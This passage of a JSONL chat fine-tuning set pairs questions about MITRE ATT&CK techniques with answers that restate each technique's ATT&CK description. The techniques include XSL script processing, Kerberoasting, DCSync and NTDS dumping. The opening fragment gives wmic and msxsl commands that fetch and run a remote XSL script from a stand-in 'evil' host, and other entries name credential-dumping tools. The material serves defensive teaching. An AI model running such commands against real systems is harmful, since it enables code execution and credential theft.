Mar 2019)* <code>msxsl.exe customers[.]xml script[.]xsl</code>* <code>msxsl.exe script[.]xsl script[.]xsl</code>* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>Another variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>* Remote File: <code>wmic os get /FORMAT:\u201dhttps[:]//example[.]com/evil[.]xsl\u201d</code>. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Scan Databases' and with the Id: T1596.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Scan Databases' and with the Id: T1596.005 is described as follows: Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan)Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hidden Files and Directories' and with the Id: T1564.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hidden Files and Directories' and with the Id: T1564.001 is described as follows: Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).On Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.. The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Create Snapshot' and with the Id: T1578.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Create Snapshot' and with the Id: T1578.001 is described as follows: An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020). The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Determine Physical Locations' and with the Id: T1591.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Determine Physical Locations' and with the Id: T1591.001 is described as follows: Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Office Test' and with the Id: T1137.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Office Test' and with the Id: T1137.002 is described as follows: Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)There exist user and global Registry keys for the Office Test feature, such as:* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.. The systems targeted by this attack pattern are: Windows, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Develop Capabilities' and with the Id: T1587 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Develop Capabilities' and with the Id: T1587 is described as follows: Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Dynamic Data Exchange' and with the Id: T1173 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Dynamic Data Exchange' and with the Id: T1173 is described as follows: Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'NTDS' and with the Id: T1003.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'NTDS' and with the Id: T1003.003 is described as follows: Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.* Volume Shadow Copy* secretsdump.py* Using the in-built Windows tool, ntdsutil.exe* Invoke-NinjaCopy. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SNMP (MIB Dump)' and with the Id: T1602.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SNMP (MIB Dump)' and with the Id: T1602.001 is described as follows: Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) . The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Steganography' and with the Id: T1001.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Steganography' and with the Id: T1001.002 is described as follows: Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Malicious Link' and with the Id: T1204.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Malicious Link' and with the Id: T1204.001 is described as follows: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Application Access Token' and with the Id: T1550.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Application Access Token' and with the Id: T1550.001 is described as follows: Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured \u2013 for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user\u2019s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.. The systems targeted by this attack pattern are: Office 365, SaaS, Google Workspace, Containers, IaaS, Azure AD ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LSASS Driver' and with the Id: T1547.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LSASS Driver' and with the Id: T1547.008 is described as follows: Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Service Execution' and with the Id: T1569.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Service Execution' and with the Id: T1569.002 is described as follows: Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Accounts' and with the Id: T1078.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Accounts' and with the Id: T1078.004 is described as follows: Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. (Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)Service or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.An adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. Cloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. . The systems targeted by this attack pattern are: Azure AD, Office 365, SaaS, IaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Environmental Keying' and with the Id: T1480.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Environmental Keying' and with the Id: T1480.001 is described as follows: Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Fallback Channels' and with the Id: T1008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Fallback Channels' and with the Id: T1008 is described as follows: Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.. The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'NTFS File Attributes' and with the Id: T1564.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'NTFS File Attributes' and with the Id: T1564.004 is described as follows: Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Kerberoasting' and with the Id: T1558.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Kerberoasting' and with the Id: T1558.003 is described as follows: Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)This same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'NTFS File Attributes' and with the Id: T1096 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'NTFS File Attributes' and with the Id: T1096 is described as follows: Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DCSync' and with the Id: T1003.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DCSync' and with the Id: T1003.006 is described as follows: Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)DCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Time Discovery' and with the Id: T1124 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Time Discovery' and with the Id: T1124 is described as follows: An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time)System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service) In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd)In addition, system calls \u2013 such as <code>time()</code> \u2013 have been used to collect the current time on Linux devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb). The systems targeted by this attack pattern are: Windows, Network, Linux, macOS ."}]}
